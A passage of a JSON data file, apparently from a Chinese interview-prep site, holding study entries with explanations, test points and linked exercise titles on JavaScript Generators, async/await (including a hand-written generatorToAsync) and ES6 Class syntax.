}\n```\n\n---\n\n### **3. `next()` 方法**\n`next()` 方法用于启动 **Generator** 函数的执行或恢复函数的执行，每次调用时都会返回一个包含 `value` 和 `done` 的对象。`done` 表示是否已执行完所有 `yield`。\n\n**考察点**：\n- `next()` 方法的作用和返回值。\n- `done` 属性的含义。\n- 如何通过 `next()` 恢复和暂停函数的执行。\n\n**示例问题**：\n- `next()` 方法的返回值是什么？它在 **Generator** 中如何工作？\n  \n**代码示例**：\n```javascript\nfunction* myGenerator() {\n  yield 1;\n  yield 2;\n}\n\nconst gen = myGenerator();\nconsole.log(gen.next()); // { value: 1, done: false }\nconsole.log(gen.next()); // { value: 2, done: false }\nconsole.log(gen.next()); // { value: undefined, done: true }\n```\n\n---\n\n### **4. `return()` 方法**\n`return()` 方法用于提前结束 **Generator** 函数的执行，返回指定的值，并且使得 `done` 为 `true`。如果 `Generator` 函数已经完成，它仍然会返回一个对象，表示执行已结束。\n\n**考察点**：\n- `return()` 方法的作用。\n- `return()` 在 **Generator** 中与 `yield` 的区别。\n- `return` 的返回值。\n\n**示例问题**：\n- `return()` 方法是如何影响 **Generator** 执行的？它的返回值是什么？\n  \n**代码示例**：\n```javascript\nfunction* myGenerator() {\n  yield 1;\n  yield 2;\n  return 3;\n}\n\nconst gen = myGenerator();\nconsole.log(gen.next()); // { value: 1, done: false }\nconsole.log(gen.return(100)); // { value: 100, done: true }\nconsole.log(gen.next()); // { value: undefined, done: true }\n```\n\n---\n\n### **5. `throw()` 方法**\n**`throw()`** 方法可以在 **Generator** 函数内部抛出一个错误，并使 **Generator** 函数的执行被中断，`done` 会变为 `true`。\n\n**考察点**：\n- `throw()` 方法的作用，如何用于错误处理。\n- 如何通过 `throw()` 让 **Generator** 函数中断并抛出错误。\n\n**示例问题**：\n- `throw()` 方法的作用是什么？它如何影响 **Generator** 执行？\n  \n**代码示例**：\n```javascript\nfunction* myGenerator() {\n  try {\n    yield 1;\n    yield 2;\n  } catch (error) {\n    console.log('Caught error:', error);\n  }\n}\n\nconst gen = myGenerator();\nconsole.log(gen.next()); // { value: 1, done: false }\nconsole.log(gen.throw('Something went wrong')); // Caught error: Something went wrong\nconsole.log(gen.next()); // { value: undefined, done: true }\n```\n\n---\n\n### **6. `Generator` 与异步编程**\n**Generator** 可以与 **Promise** 结合使用来实现异步编程，使用 `yield` 来等待异步操作完成，然后恢复执行。通过 **`co`** 模块或 `async/await` 语法，可以简化异步流程的处理。\n\n**考察点**：\n- 如何通过 `yield` 等待 **Promise** 完成。\n- `Generator` 和 `Promise` 的结合使用。\n- `async/await` 与 `Generator` 的关系。\n\n**示例问题**：\n- 如何将 **Generator** 与 `Promise` 结合，处理异步操作？\n- 你如何在 **Generator** 中使用 `yield` 来等待异步操作？\n\n**代码示例**：\n```javascript\nfunction* fetchData() {\n  const data = yield fetch('https://jsonplaceholder.typicode.com/todos/1');\n  console.log(data);\n}\n\n// 手动执行 Generator，模拟异步操作\nfunction run(generator) {\n  const gen = generator();\n  const promise = gen.next().value;\n  promise.then(response => response.json())\n         .then(data => gen.next(data));\n}\n\nrun(fetchData);\n```\n\n---\n\n### **7. `Generator` 的迭代器特性**\n**Generator** 本质上是一个迭代器对象，具有 `next()` 方法，每次调用 `next()` 都会返回一个对象，该对象包含 `value` 和 `done` 属性。它也可以用于 `for...of` 循环进行遍历。\n\n**考察点**：\n- **Generator** 的迭代器特性，如何与 `for...of` 循环一起使用。\n- `value` 和 `done` 属性的含义。\n- **Generator** 对象是否可以被遍历。\n\n**示例问题**：\n- 如何使用 `for...of` 来遍历一个 **Generator** 函数的返回值？\n- **Generator** 如何实现迭代器接口，如何与 `for...of` 配合使用？\n\n**代码示例**：\n```javascript\nfunction* myGenerator() {\n  yield 1;\n  yield 2;\n  yield 3;\n}\n\nfor (let value of myGenerator()) {\n  console.log(value); // 1, 2, 3\n}\n```\n\n---\n\n### **8. `Generator` 的应用场景**\n- 异步编程：`Generator` 函数通过 `yield` 暂停函数的执行，适用于逐步处理异步任务。\n- 状态机：利用 **Generator** 来实现可暂停和恢复的状态机。\n- 遍历器模式：使用 **Generator** 创建自定义的迭代器。\n\n**考察点**：\n- **Generator** 在异步编程中的实际应用。\n- 结合 **Generator** 的状态机设计模式。\n- 使用 **Generator** 生成自定义的迭代器。\n\n",
    "exerciseKeyList": "[\"231bf96d-c071-4e8e-9db8-cd0fa0763fc5\",\"f355de02-e03c-4d97-ac11-cd1de62867ab\",\"82b536ee-2a79-4e64-b238-061656ca8ca9\",\"6b4f3ad8-5cd8-49f3-941c-c916615546d0\"]",
    "vipLimit": 1,
    "level": 3.5,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:41:38.000Z",
    "updateAt": "2025-01-08T12:29:12.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "231bf96d-c071-4e8e-9db8-cd0fa0763fc5",
        "title": "generator 是怎么做到中断和恢复的？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-31T01:20:21.000Z",
        "updateAt": "2024-07-19T10:37:27.000Z"
      },
      {
        "exerciseKey": "6b4f3ad8-5cd8-49f3-941c-c916615546d0",
        "title": "怎么理解ES6中 Generator的？使用场景有哪些？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-03T13:37:25.000Z",
        "updateAt": "2024-08-14T12:05:01.000Z"
      },
      {
        "exerciseKey": "82b536ee-2a79-4e64-b238-061656ca8ca9",
        "title": "说说你对 Iterator, Generator 和 Async/Await 的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-11-15T12:44:49.000Z",
        "updateAt": "2024-08-10T17:07:04.000Z"
      },
      {
        "exerciseKey": "f355de02-e03c-4d97-ac11-cd1de62867ab",
        "title": "async/await、generator、promise 这三者的关联和区别是什么?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-15T13:33:11.000Z",
        "updateAt": "2024-08-10T17:07:17.000Z"
      }
    ]
  },
  "56": {
    "id": 56,
    "tagId": 24,
    "title": "Async/Await",
    "explanation": "## async/await用法\n\n其实你要实现一个东西之前，最好是先搞清楚这两样东西\n\n-   这个东西有什么用？\n-   这个东西是怎么用的？\n\n### 有什么用？\n\n`async/await`的用处就是：**用同步方式，执行异步操作**，怎么说呢？举个例子\n\n比如我现在有一个需求：先请求完`接口1`，再去请求`接口2`，我们通常会这么做\n\n```js\nfunction request(num) { // 模拟接口请求\n  return new Promise(resolve => {\n    setTimeout(() => {\n      resolve(num * 2)\n    }, 1000)\n  })\n}\n\nrequest(1).then(res1 => {\n  console.log(res1) // 1秒后 输出 2\n\n  request(2).then(res2 => {\n    console.log(res2) // 2秒后 输出 4\n  })\n})\n```\n\n或者我现在又有一个需求：先请求完`接口1`，再拿`接口1`返回的数据，去当做`接口2`的请求参数，那我们也可以这么做\n\n```js\nrequest(5).then(res1 => {\n  console.log(res1) // 1秒后 输出 10\n\n  request(res1).then(res2 => {\n    console.log(res2) // 2秒后 输出 20\n  })\n})\n```\n\n其实这么做是没问题的，但是如果嵌套的多了，不免有点不雅观，这个时候就可以用`async/await`来解决了\n\n```js\nasync function fn () {\n  const res1 = await request(5)\n  const res2 = await request(res1)\n  console.log(res2) // 2秒后输出 20\n}\nfn()\n```\n\n### 是怎么用？\n\n还是用刚刚的例子\n\n需求一：\n\n```js\nasync function fn () {\n  await request(1)\n  await request(2)\n  // 2秒后执行完\n}\nfn()\n```\n\n需求二：\n\n```js\nasync function fn () {\n  const res1 = await request(5)\n  const res2 = await request(res1)\n  console.log(res2) // 2秒后输出 20\n}\nfn()\n```\n\n![截屏2021-09-11 下午9.57.58.png](https://static.ecool.fun//article/c6002d47-9a75-4ee6-a144-b4a6f60f128d.awebp)\n\n其实就类似于生活中的`排队`，咱们生活中排队买东西，肯定是要上一个人买完，才轮到下一个人。而上面也一样，在`async`函数中，`await`规定了异步操作只能一个一个排队执行，从而达到**用同步方式，执行异步操作**的效果，这里注意了：**await只能在async函数中使用，不然会报错哦**\n\n刚刚上面的例子`await`后面都是跟着异步操作`Promise`，那如果不接`Promise`会怎么样呢？\n\n```js\nfunction request(num) { // 去掉Promise\n  setTimeout(() => {\n    console.log(num * 2)\n  }, 1000)\n}\n\nasync function fn() {\n  await request(1) // 2\n  await request(2) // 4\n  // 1秒后执行完  同时输出\n}\nfn()\n```\n\n可以看出，如果`await`后面接的不是`Promise`的话，有可能其实是达不到`排队`的效果的\n\n说完`await`，咱们聊聊`async`吧，`async`是一个位于function之前的前缀，只有`async函数`中，才能使用`await`。那`async`执行完是返回一个什么东西呢？\n\n```js\nasync function fn () {}\nconsole.log(fn) // [AsyncFunction: fn]\nconsole.log(fn()) // Promise {<fulfilled>: undefined}\n```\n\n可以看出，`async函数`执行完会自动返回一个状态为`fulfilled`的Promise，也就是成功状态，但是值却是undefined，那要怎么才能使值不是undefined呢？很简单，函数有`return`返回值就行了\n\n```js\nasync function fn (num) {\n  return num\n}\nconsole.log(fn) // [AsyncFunction: fn]\nconsole.log(fn(10)) // Promise {<fulfilled>: 10}\nfn(10).then(res => console.log(res)) // 10\n```\n\n可以看出，此时就有值了，并且还能使用`then方法`进行输出\n\n### 总结\n\n总结一下`async/await`的知识点\n\n-   await只能在async函数中使用，不然会报错\n-   async函数返回的是一个Promise对象，有无值看有无return值\n-   await后面最好是接Promise，虽然接其他值也能达到排队效果\n-   async/await作用是**用同步方式，执行异步操作**\n\n## 什么是语法糖？\n\n前面说了，`async/await`是一种`语法糖`，诶！好多同学就会问，啥是`语法糖`呢？我个人理解就是，`语法糖`就是一个东西，这个东西你就算不用他，你用其他手段也能达到这个东西同样的效果，但是可能就没有这个东西这么方便了。\n\n-   举个生活中的例子吧：你走路也能走到北京，但是你坐飞机会更快到北京。\n-   举个代码中的例子吧：ES6的`class`也是语法糖，因为其实用普通`function`也能实现同样效果\n\n回归正题，`async/await`是一种`语法糖`，那就说明用其他方式其实也可以实现他的效果，我们今天就是讲一讲怎么去实现`async/await`，用到的是ES6里的`迭代函数——generator函数`\n\n## generator函数\n\n### 基本用法\n\n`generator函数`跟普通函数在写法上的区别就是，多了一个星号`*`，并且只有在`generator函数`中才能使用`yield`，什么是`yield`呢，他相当于`generator函数`执行的`中途暂停点`，比如下方有3个暂停点。而怎么才能暂停后继续走呢？那就得使用到`next方法`，`next方法`执行后会返回一个对象，对象中有`value 和 done`两个属性\n\n-   value：暂停点后面接的值，也就是yield后面接的值\n-   done：是否generator函数已走完，没走完为false，走完为true\n\n```js\nfunction* gen() {\n  yield 1\n  yield 2\n  yield 3\n}\nconst g = gen()\nconsole.log(g.next()) // { value: 1, done: false }\nconsole.log(g.next()) // { value: 2, done: false }\nconsole.log(g.next()) // { value: 3, done: false }\nconsole.log(g.next()) // { value: undefined, done: true }\n```\n\n可以看到最后一个是undefined，这取决于你generator函数有无返回值\n\n```js\nfunction* gen() {\n  yield 1\n  yield 2\n  yield 3\n  return 4\n}\nconst g = gen()\nconsole.log(g.next()) // { value: 1, done: false }\nconsole.log(g.next()) // { value: 2, done: false }\nconsole.log(g.next()) // { value: 3, done: false }\nconsole.log(g.next()) // { value: 4, done: true }\n```\n\n![截屏2021-09-11 下午9.46.17.png](https://static.ecool.fun//article/ebe1bdf3-3bcb-433e-af1a-c48f9ef5a9ba.awebp)\n\n### yield后面接函数\n\nyield后面接函数的话，到了对应暂停点yield，会马上执行此函数，并且该函数的执行返回值，会被当做此暂停点对象的`value`\n\n```js\nfunction fn(num) {\n  console.log(num)\n  return num\n}\nfunction* gen() {\n  yield fn(1)\n  yield fn(2)\n  return 3\n}\nconst g = gen()\nconsole.log(g.next()) \n// 1\n// { value: 1, done: false }\nconsole.log(g.next())\n// 2\n//  { value: 2, done: false }\nconsole.log(g.next()) \n// { value: 3, done: true }\n```\n\n### yield后面接Promise\n\n前面说了，函数执行返回值会当做暂停点对象的value值，那么下面例子就可以理解了，前两个的value都是pending状态的Promise对象\n\n```js\nfunction fn(num) {\n  return new Promise(resolve => {\n    setTimeout(() => {\n      resolve(num)\n    }, 1000)\n  })\n}\nfunction* gen() {\n  yield fn(1)\n  yield fn(2)\n  return 3\n}\nconst g = gen()\nconsole.log(g.next()) // { value: Promise { <pending> }, done: false }\nconsole.log(g.next()) // { value: Promise { <pending> }, done: false }\nconsole.log(g.next()) // { value: 3, done: true }\n```\n\n![截屏2021-09-11 下午10.51.38.png](https://static.ecool.fun//article/8ddf93c9-80c7-484a-932d-3510df836e4c.awebp)\n\n其实我们想要的结果是，两个Promise的结果`1 和 2`，那怎么做呢？很简单，使用Promise的then方法就行了\n\n```js\nconst g = gen()\nconst next1 = g.next()\nnext1.value.then(res1 => {\n  console.log(next1) // 1秒后输出 { value: Promise { 1 }, done: false }\n  console.log(res1) // 1秒后输出 1\n\n  const next2 = g.next()\n  next2.value.then(res2 => {\n    console.log(next2) // 2秒后输出 { value: Promise { 2 }, done: false }\n    console.log(res2) // 2秒后输出 2\n    console.log(g.next()) // 2秒后输出 { value: 3, done: true }\n  })\n})\n```\n\n![截屏2021-09-11 下午10.38.37.png](https://static.ecool.fun//article/68733db3-3dc7-4417-9ab9-1b4b5d184350.awebp)\n\n### next函数传参\n\ngenerator函数可以用`next方法`来传参，并且可以通过`yield`来接收这个参数，注意两点\n\n-   第一次next传参是没用的，只有从第二次开始next传参才有用\n-   next传值时，要记住顺序是，先右边yield，后左边接收参数\n\n```js\nfunction* gen() {\n  const num1 = yield 1\n  console.log(num1)\n  const num2 = yield 2\n  console.log(num2)\n  return 3\n}\nconst g = gen()\nconsole.log(g.next()) // { value: 1, done: false }\nconsole.log(g.next(11111))\n// 11111\n//  { value: 2, done: false }\nconsole.log(g.next(22222)) \n// 22222\n// { value: 3, done: true }\n```\n\n![截屏2021-09-11 下午10.53.02.png](https://static.ecool.fun//article/41b42f7e-e87b-4839-97a9-098f3bdd629e.awebp)\n\n### Promise+next传参\n\n前面讲了\n\n-   yield后面接Promise\n-   next函数传参\n\n那这两个组合起来会是什么样呢？\n\n```js\nfunction fn(nums) {\n  return new Promise(resolve => {\n    setTimeout(() => {\n      resolve(nums * 2)\n    }, 1000)\n  })\n}\nfunction* gen() {\n  const num1 = yield fn(1)\n  const num2 = yield fn(num1)\n  const num3 = yield fn(num2)\n  return num3\n}\nconst g = gen()\nconst next1 = g.next()\nnext1.value.then(res1 => {\n  console.log(next1) // 1秒后同时输出 { value: Promise { 2 }, done: false }\n  console.log(res1) // 1秒后同时输出 2\n\n  const next2 = g.next(res1) // 传入上次的res1\n  next2.value.then(res2 => {\n    console.log(next2) // 2秒后同时输出 { value: Promise { 4 }, done: false }\n    console.log(res2) // 2秒后同时输出 4\n\n    const next3 = g.next(res2) // 传入上次的res2\n    next3.value.then(res3 => {\n      console.log(next3) // 3秒后同时输出 { value: Promise { 8 }, done: false }\n      console.log(res3) // 3秒后同时输出 8\n\n       // 传入上次的res3\n      console.log(g.next(res3)) // 3秒后同时输出 { value: 8, done: true }\n    })\n  })\n})\n```\n\n![截屏2021-09-11 下午11.05.44.png](https://static.ecool.fun//article/20b48702-08e8-49ca-978c-c7f12526635d.awebp)\n\n## 实现async/await\n\n其实上方的`generator函数`的`Promise+next传参`，就很像`async/await`了，区别在于\n\n-   gen函数执行返回值不是Promise，asyncFn执行返回值是Promise\n-   gen函数需要执行相应的操作，才能等同于asyncFn的排队效果\n-   gen函数执行的操作是不完善的，因为并不确定有几个yield，不确定会嵌套几次\n\n![截屏2021-09-11 下午11.53.41.png](https://static.ecool.fun//article/e88a2fe0-dfb0-418b-a178-3ef7b38f13ee.awebp)\n\n那我们怎么办呢？我们可以封装一个高阶函数。什么是`高阶函数`呢？`高阶函数`的特点是：**参数是函数，返回值也可以是函数**。下方的`highorderFn`就是一个`高阶函数`\n\n```js\nfunction highorderFn(函数) {\n    // 一系列处理\n    \n    return 函数\n}\n```\n\n我们可以封装一个高阶函数，接收一个generator函数，并经过一系列处理，返回一个具有async函数功能的函数\n\n```js\nfunction generatorToAsync(generatorFn) {\n  // 经过一系列处理\n  \n  return 具有async函数功能的函数\n}\n```\n\n### 返回值Promise\n\n之前我们说到，async函数的执行返回值是一个Promise，那我们要怎么实现相同的结果呢\n\n```js\nfunction* gen() {\n\n}\n\nconst asyncFn = generatorToAsync(gen)\n\nconsole.log(asyncFn()) // 期望这里输出 Promise\n```\n\n其实很简单，`generatorToAsync函数`里做一下处理就行了\n\n```js\nfunction* gen() {\n\n}\nfunction generatorToAsync (generatorFn) {\n  return function () {\n    return new Promise((resolve, reject) => {\n\n    })\n  }\n}\n\nconst asyncFn = generatorToAsync(gen)\n\nconsole.log(asyncFn()) // Promise\n```\n\n### 加入一系列操作\n\n咱们把之前的处理代码，加入`generatorToAsync函数`中\n\n```js\nfunction fn(nums) {\n  return new Promise(resolve => {\n    setTimeout(() => {\n      resolve(nums * 2)\n    }, 1000)\n  })\n}\nfunction* gen() {\n  const num1 = yield fn(1)\n  const num2 = yield fn(num1)\n  const num3 = yield fn(num2)\n  return num3\n}\nfunction generatorToAsync(generatorFn) {\n  return function () {\n    return new Promise((resolve, reject) => {\n      const g = generatorFn()\n      const next1 = g.next()\n      next1.value.then(res1 => {\n\n        const next2 = g.next(res1) // 传入上次的res1\n        next2.value.then(res2 => {\n\n          const next3 = g.next(res2) // 传入上次的res2\n          next3.value.then(res3 => {\n\n            // 传入上次的res3\n            resolve(g.next(res3).value)\n          })\n        })\n      })\n    })\n  }\n}\n\nconst asyncFn = generatorToAsync(gen)\n\nasyncFn().then(res => console.log(res)) // 3秒后输出 8\n```\n\n可以发现，咱们其实已经实现了以下的`async/await`的结果了\n\n```js\nasync function asyncFn() {\n  const num1 = await fn(1)\n  const num2 = await fn(num1)\n  const num3 = await fn(num2)\n  return num3\n}\nasyncFn().then(res => console.log(res)) // 3秒后输出 8\n```\n\n### 完善代码\n\n上面的代码其实都是死代码，因为一个async函数中可能有2个await，3个await，5个await ，其实await的个数是不确定的。同样类比，generator函数中，也可能有2个yield，3个yield，5个yield，所以咱们得把代码写成活的才行\n\n```js\nfunction generatorToAsync(generatorFn) {\n  return function() {\n    const gen = generatorFn.apply(this, arguments) // gen有可能传参\n\n    // 返回一个Promise\n    return new Promise((resolve, reject) => {\n\n      function go(key, arg) {\n        let res\n        try {\n          res = gen[key](arg) // 这里有可能会执行返回reject状态的Promise\n        } catch (error) {\n          return reject(error) // 报错的话会走catch，直接reject\n        }\n\n        // 解构获得value和done\n        const { value, done } = res\n        if (done) {\n          // 如果done为true，说明走完了，进行resolve(value)\n          return resolve(value)\n        } else {\n          // 如果done为false，说明没走完，还得继续走\n\n          // value有可能是：常量，Promise，Promise有可能是成功或者失败\n          return Promise.resolve(value).then(val => go('next', val), err => go('throw', err))\n        }\n      }\n\n      go(\"next\") // 第一次执行\n    })\n  }\n}\n\nconst asyncFn = generatorToAsync(gen)\n\nasyncFn().then(res => console.log(res))\n```\n\n这样的话，无论是多少个yield都会排队执行了，咱们把代码写成活的了\n\n### 示例\n\n`async/await`版本\n\n```js\nasync function asyncFn() {\n  const num1 = await fn(1)\n  console.log(num1) // 2\n  const num2 = await fn(num1)\n  console.log(num2) // 4\n  const num3 = await fn(num2)\n  console.log(num3) // 8\n  return num3\n}\nconst asyncRes = asyncFn()\nconsole.log(asyncRes) // Promise\nasyncRes.then(res => console.log(res)) // 8\n```\n\n使用`generatorToAsync函数`的版本\n\n```js\nfunction* gen() {\n  const num1 = yield fn(1)\n  console.log(num1) // 2\n  const num2 = yield fn(num1)\n  console.log(num2) // 4\n  const num3 = yield fn(num2)\n  console.log(num3) // 8\n  return num3\n}\n\nconst genToAsync = generatorToAsync(gen)\nconst asyncRes = genToAsync()\nconsole.log(asyncRes) // Promise\nasyncRes.then(res => console.log(res)) // 8\n```\n\n",
    "testPoint": "## 一、基本语法与原理\n\n### 1. **定义与作用**\n\n* `async`：声明一个函数为异步函数，返回一个 `Promise`。\n* `await`：只能在 `async` 函数中使用，用于等待 `Promise` 的结果。\n\n### 2. **语法示例**\n\n```js\nasync function fetchData() {\n  try {\n    const res = await fetch('/api');\n    const data = await res.json();\n    return data;\n  } catch (err) {\n    console.error(err);\n  }\n}\n```\n\n### 3. **语法糖本质**\n\n* `async/await` 是基于 **Generator + Promise** 的语法糖，底层依赖 `Promise`。\n\n## 二、执行机制考点\n\n### 1. **执行顺序**\n\n* `async` 函数中的代码会同步执行到第一个 `await`。\n* `await` 后的代码会被放入微任务队列，异步执行。\n\n```js\nasync function test() {\n  console.log(1);\n  await Promise.resolve();\n  console.log(2);\n}\ntest();\nconsole.log(3); // 输出顺序：1, 3, 2\n```\n\n### 2. **错误处理**\n\n* 推荐配合 `try...catch` 使用，优于 `.catch()`。\n\n## 三、常见使用场景\n\n* 异步请求封装\n* 顺序执行多个异步操作（替代 `.then()` 链式调用）\n* 异步函数中循环控制（for、for...of 支持 `await`）\n\n## 四、与 Promise 的对比考点\n\n| 项目   | Promise            | async/await                  |\n| ---- | ------------------ | ---------------------------- |\n| 可读性  | 嵌套多时较差             | 更像同步代码，结构清晰                  |\n| 错误处理 | 通过 `.catch()` 捕获   | 使用 `try...catch` 更自然         |\n| 并发控制 | `Promise.all` 支持并发 | 需要手动组合 `await Promise.all()` |\n| 调试体验 | 调用栈信息易丢失           | 更好一些，但仍依赖浏览器实现               |\n\n## 五、进阶考察点\n\n### 1. **串行 vs 并行执行**\n\n```js\n// 串行（效率低）\nawait fetchA();\nawait fetchB();\n\n// 并行（推荐）\nconst [a, b] = await Promise.all([fetchA(), fetchB()]);\n```\n\n### 2. **await 后接非 Promise**\n\n* `await 123` 会返回 `123`。\n* `await` 会将普通值包装成 resolved 的 Promise。\n\n### 3. **在非 async 函数中使用 await 会报错**\n\n```js\n// 错误：SyntaxError: await is only valid in async functions\nfunction test() {\n  await something();\n}\n```\n",
    "exerciseKeyList": "[\"abdeb82d-40b0-495f-9e06-093d1b74ea65\",\"f744d88c-1501-48f5-a017-9d5a67c2b335\",\"3cadb842-10f6-4c2f-887d-ae4b6cb24aea\",\"f355de02-e03c-4d97-ac11-cd1de62867ab\",\"82b536ee-2a79-4e64-b238-061656ca8ca9\",\"59d5a988-6a18-4c41-b5da-c61aefe63042\",\"deb034d1-2a96-45b4-8576-132f2af9c797\",\"fbcd6444-9c0f-492a-b138-bd205bb4bf1d\",\"1199c5d8-034c-4cb0-a3c7-55ef5f6ec56f\",\"29821d8e-dc41-4581-91fe-9fde7658a559\"]",
    "vipLimit": 1,
    "level": 3,
    "pointOrder": 1,
    "createAt": "2024-10-02T14:45:54.000Z",
    "updateAt": "2025-07-17T14:43:18.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "1199c5d8-034c-4cb0-a3c7-55ef5f6ec56f",
        "title": "实现一个等待函数，支持让 async 函数在执行时暂停一段时间，函数的入参为暂停的时间\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-10-10T12:42:12.000Z",
        "updateAt": "2023-04-23T20:18:17.000Z"
      },
      {
        "exerciseKey": "29821d8e-dc41-4581-91fe-9fde7658a559",
        "title": "async、await 实现原理",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-04-14T01:30:57.000Z",
        "updateAt": "2024-08-10T17:06:32.000Z"
      },
      {
        "exerciseKey": "3cadb842-10f6-4c2f-887d-ae4b6cb24aea",
        "title": "使用 async/await 时，是否有必要加 try catch?",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:26.000Z",
        "updateAt": "2024-08-28T01:22:32.000Z"
      },
      {
        "exerciseKey": "59d5a988-6a18-4c41-b5da-c61aefe63042",
        "title": "如何让 useEffect 支持 async/await？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-06-24T01:05:03.000Z",
        "updateAt": "2024-08-10T17:06:43.000Z"
      },
      {
        "exerciseKey": "82b536ee-2a79-4e64-b238-061656ca8ca9",
        "title": "说说你对 Iterator, Generator 和 Async/Await 的理解",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-11-15T12:44:49.000Z",
        "updateAt": "2024-08-10T17:07:04.000Z"
      },
      {
        "exerciseKey": "abdeb82d-40b0-495f-9e06-093d1b74ea65",
        "title": "async/await 原理， 手写 async 函数？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:45.000Z",
        "updateAt": "2024-08-14T12:03:19.000Z"
      },
      {
        "exerciseKey": "deb034d1-2a96-45b4-8576-132f2af9c797",
        "title": "async/await 怎么进行错误处理？\n",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2022-05-16T04:37:12.000Z",
        "updateAt": "2024-08-10T17:06:38.000Z"
      },
      {
        "exerciseKey": "f355de02-e03c-4d97-ac11-cd1de62867ab",
        "title": "async/await、generator、promise 这三者的关联和区别是什么?",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2023-05-15T13:33:11.000Z",
        "updateAt": "2024-08-10T17:07:17.000Z"
      },
      {
        "exerciseKey": "f744d88c-1501-48f5-a017-9d5a67c2b335",
        "title": "在没有async/await 的时候, koa是怎么实现的洋葱模型？",
        "category": "QA",
        "vipLimit": 1,
        "createAt": "2024-08-13T08:30:41.000Z",
        "updateAt": "2024-08-14T20:41:36.000Z"
      },
      {
        "exerciseKey": "fbcd6444-9c0f-492a-b138-bd205bb4bf1d",
        "title": "async/await 和 Promise 有什么关系？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-11T07:29:11.000Z",
        "updateAt": "2024-08-10T21:18:39.000Z"
      }
    ]
  },
  "57": {
    "id": 57,
    "tagId": 24,
    "title": "Class",
    "explanation": "# Class 的基本语法\n\n## 简介\n\n### 类的由来\n\nJavaScript 语言中，生成实例对象的传统方法是通过构造函数。下面是一个例子。\n\n```javascript\nfunction Point(x, y) {\n  this.x = x;\n  this.y = y;\n}\n\nPoint.prototype.toString = function () {\n  return '(' + this.x + ', ' + this.y + ')';\n};\n\nvar p = new Point(1, 2);\n```\n\n上面这种写法跟传统的面向对象语言（比如 C++ 和 Java）差异很大，很容易让新学习这门语言的程序员感到困惑。\n\nES6 提供了更接近传统语言的写法，引入了 Class（类）这个概念，作为对象的模板。通过`class`关键字，可以定义类。\n\n基本上，ES6 的`class`可以看作只是一个语法糖，它的绝大部分功能，ES5 都可以做到，新的`class`写法只是让对象原型的写法更加清晰、更像面向对象编程的语法而已。上面的代码用 ES6 的`class`改写，就是下面这样。\n\n```javascript\nclass Point {\n  constructor(x, y) {\n    this.x = x;\n    this.y = y;\n  }\n\n  toString() {\n    return '(' + this.x + ', ' + this.y + ')';\n  }\n}\n```\n\n上面代码定义了一个“类”，可以看到里面有一个`constructor()`方法，这就是构造方法，而`this`关键字则代表实例对象。这种新的 Class 写法，本质上与本章开头的 ES5 的构造函数`Point`是一致的。\n\n`Point`类除了构造方法，还定义了一个`toString()`方法。注意，定义`toString()`方法的时候，前面不需要加上`function`这个关键字，直接把函数定义放进去了就可以了。另外，方法与方法之间不需要逗号分隔，加了会报错。\n\nES6 的类，完全可以看作构造函数的另一种写法。\n\n```javascript\nclass Point {\n  // ...\n}\n\ntypeof Point // \"function\"\nPoint === Point.prototype.constructor // true\n```\n\n上面代码表明，类的数据类型就是函数，类本身就指向构造函数。\n\n使用的时候，也是直接对类使用`new`命令，跟构造函数的用法完全一致。\n\n```javascript\nclass Bar {\n  doStuff() {\n    console.log('stuff');\n  }\n}\n\nconst b = new Bar();\nb.doStuff() // \"stuff\"\n```\n\n构造函数的`prototype`属性，在 ES6 的“类”上面继续存在。事实上，类的所有方法都定义在类的`prototype`属性上面。\n\n```javascript\nclass Point {\n  constructor() {\n    // ...\n  }\n\n  toString() {\n    // ...\n  }\n\n  toValue() {\n    // ...\n  }\n}\n\n// 等同于\n\nPoint.prototype = {\n  constructor() {},\n  toString() {},\n  toValue() {},\n};\n```\n\n上面代码中，`constructor()`、`toString()`、`toValue()`这三个方法，其实都是定义在`Point.prototype`上面。\n\n因此，在类的实例上面调用方法，其实就是调用原型上的方法。\n\n```javascript\nclass B {}\nconst b = new B();\n\nb.constructor === B.prototype.constructor // true\n```\n\n上面代码中，`b`是`B`类的实例，它的`constructor()`方法就是`B`类原型的`constructor()`方法。\n\n由于类的方法都定义在`prototype`对象上面，所以类的新方法可以添加在`prototype`对象上面。`Object.assign()`方法可以很方便地一次向类添加多个方法。\n\n```javascript\nclass Point {\n  constructor(){\n    // ...\n  }\n}\n\nObject.assign(Point.prototype, {\n  toString(){},\n  toValue(){}\n});\n```\n\n`prototype`对象的`constructor()`属性，直接指向“类”的本身，这与 ES5 的行为是一致的。\n\n```javascript\nPoint.prototype.constructor === Point // true\n```\n\n另外，类的内部所有定义的方法，都是不可枚举的（non-enumerable）。\n\n```javascript\nclass Point {\n  constructor(x, y) {\n    // ...\n  }\n\n  toString() {\n    // ...\n  }\n}\n\nObject.keys(Point.prototype)\n// []\nObject.getOwnPropertyNames(Point.prototype)\n// [\"constructor\",\"toString\"]\n```\n\n上面代码中，`toString()`方法是`Point`类内部定义的方法，它是不可枚举的。这一点与 ES5 的行为不一致。\n\n```javascript\nvar Point = function (x, y) {\n  // ...\n};\n\nPoint.prototype.toString = function () {\n  // ...\n};\n\nObject.keys(Point.prototype)\n// [\"toString\"]\nObject.getOwnPropertyNames(Point.prototype)\n// [\"constructor\",\"toString\"]\n```\n\n上面代码采用 ES5 的写法，`toString()`方法就是可枚举的。\n\n### constructor 方法\n\n`constructor()`方法是类的默认方法，通过`new`命令生成对象实例时，自动调用该方法。一个类必须有`constructor()`方法，如果没有显式定义，一个空的`constructor()`方法会被默认添加。\n\n```javascript\nclass Point {\n}\n\n// 等同于\nclass Point {\n  constructor() {}\n}\n```\n\n上面代码中，定义了一个空的类`Point`，JavaScript 